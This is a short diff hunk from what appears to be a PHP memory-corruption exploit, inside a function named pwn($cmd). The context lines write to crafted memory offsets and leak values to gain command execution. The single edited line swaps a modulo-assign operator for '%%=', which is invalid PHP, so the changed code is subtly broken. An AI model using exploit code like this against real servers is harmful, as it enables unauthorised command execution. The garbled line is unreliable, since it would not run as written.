@@ -242,7 +242,7 @@ function pwn($cmd) {
         global $abc, $helper;
         write($abc, 0x68, $addr + $p - 0x10);
         $leak = strlen($helper->a);
-        if($s != 8) { $leak %= 2 << ($s * 8) - 1; }
+        if($s != 8) { $leak %%= 2 << ($s * 8) - 1; }
         return $leak;
     }
 
